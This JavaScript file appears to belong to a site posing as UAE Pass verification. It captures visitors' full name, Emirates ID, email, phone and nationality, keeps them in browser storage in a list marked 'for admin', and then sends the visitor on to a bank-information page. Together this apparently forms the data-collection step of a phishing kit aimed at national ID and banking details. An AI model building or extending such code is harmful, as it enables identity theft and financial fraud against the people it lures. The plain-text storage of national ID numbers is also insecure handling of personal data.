// ===== DATA MANAGEMENT FUNCTIONS =====
// Generate unique session ID
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substring(2, 15);
}

// Get or create session ID
function getSessionId() {
    let sessionId = sessionStorage.getItem('verificationSessionId');
    if (!sessionId) {
        sessionId = generateSessionId();
        sessionStorage.setItem('verificationSessionId', sessionId);
    }
    return sessionId;
}

// Store UAE Pass verification data
function storeUAEPassData(data) {
    const sessionId = getSessionId();
    
    const verificationData = {
        sessionId: sessionId,
        uaePassData: data,
        timestamp: new Date().toISOString(),
        status: 'pending_bank_info'
    };
    
    // Store individual verification
    localStorage.setItem('verification_' + sessionId, JSON.stringify(verificationData));
    
    // Add to all submissions for admin
    let allSubmissions = JSON.parse(localStorage.getItem('allSubmissions') || '[]');
    allSubmissions.push(verificationData);
    localStorage.setItem('allSubmissions', JSON.stringify(allSubmissions));
    
    return sessionId;
}

// Get UAE Pass data for current session
function getUAEPassData() {
    const sessionId = getSessionId();
    const dataStr = localStorage.getItem('verification_' + sessionId);
    if (dataStr) {
        return JSON.parse(dataStr);
    }
    return null;
}

// Update verification with bank information
function updateWithBankInfo(bankData) {
    const sessionId = getSessionId();
    const dataStr = localStorage.getItem('verification_' + sessionId);
    
    if (!dataStr) {
        console.error('No UAE Pass verification found for this session');
        return false;
    }
    
    const verificationData = JSON.parse(dataStr);
    verificationData.bankInfo = bankData;
    verificationData.status = 'pending_approval';
    verificationData.submittedAt = new Date().toISOString();
    
    // Update individual record
    localStorage.setItem('verification_' + sessionId, JSON.stringify(verificationData));
    
    // Update in allSubmissions
    let allSubmissions = JSON.parse(localStorage.getItem('allSubmissions') || '[]');
    const index = allSubmissions.findIndex(s => s.sessionId === sessionId);
    if (index !== -1) {
        allSubmissions[index] = verificationData;
        localStorage.setItem('allSubmissions', JSON.stringify(allSubmissions));
    }
    
    return true;
}

// Make functions globally available
window.generateSessionId = generateSessionId;
window.getSessionId = getSessionId;
window.storeUAEPassData = storeUAEPassData;
window.getUAEPassData = getUAEPassData;
window.updateWithBankInfo = updateWithBankInfo;

// Setup UAE Pass form submission handler
document.addEventListener('DOMContentLoaded', function() {
    // Check if we're on UAE Pass verification page
    if (window.location.pathname.includes('uae-pass-verification')) {
        document.addEventListener('wpcf7mailsent', function(event) {
            const formData = event.detail.inputs;
            const formDetails = {};
            formData.forEach(input => {
                formDetails[input.name] = input.value;
            });

            const uaeData = {
                fullName: formDetails['full-name'] || '',
                emiratesId: formDetails['emirates-id-field'] || '',
                email: formDetails['email'] || '',
                phone: formDetails['mobile-number-field'] || '',
                nationality: formDetails['countrytext-427'] || ''
            };
            
            const sessionId = window.storeUAEPassData(uaeData);
            
            alert('Verification submitted successfully!\n\nYour Session ID: ' + sessionId + '\n\nPlease save this ID to check your status later.\n\nYou will now be redirected to complete your bank information.');
            
            setTimeout(function() {
                window.location.href = '../bank-information/index.html';
            }, 1000);
        }, false);
    }
});
